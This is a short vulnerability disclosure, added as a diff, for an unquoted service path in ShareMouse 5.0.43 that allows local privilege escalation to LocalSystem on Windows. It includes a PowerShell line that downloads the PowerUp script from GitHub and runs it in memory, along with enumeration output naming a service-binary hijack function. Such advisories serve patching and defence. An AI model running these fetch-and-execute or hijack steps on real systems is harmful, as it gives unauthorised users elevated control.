@@ -1,0 +1,25 @@
+# Exploit Title: ShareMouse 5.0.43 - 'ShareMouse Service' Unquoted Service Path
+# Discovery Date: 2020-09-08
+# Discovery by: Alan Lacerda (alacerda)
+# Vendor Homepage: https://www.sharemouse.com/
+# Software Link: https://www.sharemouse.com/ShareMouseSetup.exe
+# Version: 5.0.43
+# Tested on OS: Microsoft Windows 10 Pro EN OS Version: 10.0.19041
+
+PS > iex (iwr https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1 -UseBasicParsing);
+PS > Invoke-AllChecks
+
+ServiceName   : ShareMouse Service
+Path          : C:\Program Files (x86)\ShareMouse\smService.exe
+StartName     : LocalSystem
+AbuseFunction : Write-ServiceBinary -ServiceName 'ShareMouse Service' -Path <HijackPath>
+
+PS >  wmic service where 'name like "%ShareMouse%"' get DisplayName,PathName,AcceptStop,StartName
+AcceptStop  DisplayName         PathName                                         StartName
+TRUE        ShareMouse Service  C:\Program Files (x86)\ShareMouse\smService.exe  LocalSystem
+
+#Exploit:
+# A successful attempt would require the local user to be able to insert their code in the system root path 
+# undetected by the OS or other security applications where it could potentially be executed during 
+# application startup or reboot. If successful, the local user's code would execute with the elevated 
+# privileges of the application.
